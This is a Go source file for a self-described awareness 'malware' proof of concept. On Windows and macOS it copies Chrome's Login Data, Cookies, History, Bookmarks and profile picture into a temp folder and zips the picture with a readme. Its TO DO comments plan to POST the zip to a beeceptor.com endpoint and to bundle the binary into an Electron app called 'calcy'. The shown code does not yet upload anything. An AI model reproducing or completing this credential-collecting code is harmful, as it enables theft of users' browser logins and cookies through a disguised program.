package main

import (
	"fmt"
	"os"
	utils "poc/pkg/utils"
	"runtime"
)

const tmp_folder_name = "trust_me"

var mac_files = []string{
	"/Library/Application Support/Google/Chrome/Default/Google Profile Picture.png",
	"/Library/Application Support/Google/Chrome/Default/Login Data",
	"/Library/Application Support/Google/Chrome/Default/Cookies",
	"/Library/Application Support/Google/Chrome/Default/History",
	"/Library/Application Support/Google/Chrome/Default/Bookmarks",
}

var win_files = []string{
	"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Google Profile Picture.png",
	"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
	"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies",
	"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History",
	"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Bookmarks",
}

var linux_files = []string{}

const readme_message = `This is just an example of what could be easily stolen from you,
all the contents in this folder were copied from your computer to here.
A zip was created with your picture and this readme file, and uploaded to a dummy endpoint.
Only you know this url, and you need to have the browser open to receive the http post content,
as soon as you close it the info will be gone.
If you see the information on your browser, any attacker could have gotten that info.
This "malware" only purpose is to raise awareness to how easily it is to steal your private information.

Be mindfull of what you download and execute.

url: `

func main() {
	switch runtime.GOOS {
	case "windows":
		// fmt.Println("windows")
		user, err := utils.GetCurrentUser()
		if err != nil {
			os.Exit(0)
		}
		tmp_folder := user.HomeDir + "\\AppData\\Local\\Temp\\" + tmp_folder_name + "\\"
		exploit(win_files, tmp_folder, "open")
	case "darwin":
		// fmt.Println("mac")
		tmp_folder := "/tmp/" + tmp_folder_name + "/"
		exploit(mac_files, tmp_folder, "open")
	default:
		fmt.Println("linux")
		tmp_folder := "/tmp/" + tmp_folder_name + "/"
		exploit(linux_files, tmp_folder, "open")

	}
}

func exploit(files []string, tmp_folder string, open_browser_cmd string) {
	// check if temp folder exists, if not, creates it
	utils.CreateTmpFolder(tmp_folder)

	user, err := utils.GetCurrentUser()
	if err != nil {
		os.Exit(0)
	}

	// honeybadger approach, try to get the file, if it doesn't succeed, it just doesn't care!
	for _, file_path := range files {
		full_path := user.HomeDir + file_path
		filename := utils.GetFileNameFromPath(full_path)
		dest := tmp_folder + filename
		// fmt.Println(dest)
		utils.FileCopy(full_path, dest)
	}

	// create readme
	random_string := utils.GenerateRandomString(40)
	readme_file := tmp_folder + "readme.txt"
	dummy_endpoint_url := "https://beeceptor.com/console/" + random_string
	readme_content := readme_message + dummy_endpoint_url + "\n\nfolder: " + tmp_folder
	utils.CreateReadme(readme_file, readme_content)

	// Zip Files
	files_to_zip := []string{
		tmp_folder + utils.GetFileNameFromPath(files[0]),
		readme_file,
	}
	utils.ZipFiles(files_to_zip, (tmp_folder + "your_secrets.zip"))

}

// TO DO

// 1. for file in files of interest, copy them to temp folder
// 2. create a dummy zip just with profile pic and a readme text created by the script
// 3. create a random string like: jaskmqwKE12334SFDSDFSVFdfjdfsdfqhf
// 4. open url https://beeceptor.com/console/jaskmqwKE12334SFDSDFSVFdfjdfsdfqhf
// 5. wait one second
// 6. make post request to the url above with zip file

// create makefile to auto build binary, copy to calcy folder and call electron-builder
